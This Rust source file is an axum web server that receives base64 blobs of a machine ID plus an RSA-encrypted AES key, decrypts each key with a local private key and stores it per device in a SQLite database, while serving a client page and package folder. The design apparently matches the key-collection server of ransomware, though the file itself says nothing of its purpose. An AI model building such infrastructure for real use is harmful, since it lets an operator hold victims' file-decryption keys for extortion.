use axum::{response::Html, routing::get, Extension, Router};
use base64::Engine;
use rsa::{pkcs1::DecodeRsaPrivateKey, Pkcs1v15Encrypt, RsaPrivateKey};
use rusqlite::Connection;
use std::{
    fs,
    sync::{Arc, Mutex},
};
use tower_http::services::ServeDir;

static PORT: i32 = 3000;
static HOST: &str = "0.0.0.0";

fn init_database() -> Connection {
    let conn = Connection::open("./device_keys.db").unwrap();
    conn.execute(
        "CREATE TABLE IF NOT EXISTS device_keys (id TEXT PRIMARY KEY, key BLOB NOT NULL)",
        (),
    )
    .unwrap();
    conn
}

fn decrypt_device_key(key: &str) -> (String, Vec<u8>) {
    let buffer = base64::engine::general_purpose::STANDARD
        .decode(key)
        .unwrap();

    let (machine_id, encrypted_aes_key) = buffer.split_at(16);
    let id = String::from_utf8(machine_id.to_vec()).unwrap();

    let pem = fs::read_to_string("priv.pem").unwrap();
    let rsa_private_key = RsaPrivateKey::from_pkcs1_pem(&pem).unwrap();

    let key = rsa_private_key
        .decrypt(Pkcs1v15Encrypt, encrypted_aes_key)
        .unwrap();

    (id, key)
}

async fn handle_device_key(Extension(conn): Extension<Arc<Mutex<Connection>>>, data: String) {
    let (id, key) = decrypt_device_key(&data);

    let conn = conn.lock().unwrap();
    conn.execute("INSERT INTO device_keys VALUES (?, ?)", (&id, &key))
        .unwrap();

    dbg!(format!("Received: {}", id));
}

async fn home() -> Html<String> {
    let html = fs::read_to_string("../client/index.html").unwrap();
    Html(html)
}

#[tokio::main]
async fn main() {
    let conn = init_database();
    let conn = Arc::new(Mutex::new(conn));

    let app = Router::new()
        .route("/", get(home).post(handle_device_key))
        .nest_service("/pkg", ServeDir::new("../client/pkg/"))
        .layer(Extension(conn));

    let listener = tokio::net::TcpListener::bind(format!("{HOST}:{PORT}"))
        .await
        .unwrap();

    println!("Server is listening at: http://{HOST}:{PORT}");
    axum::serve(listener, app).await.unwrap();
}
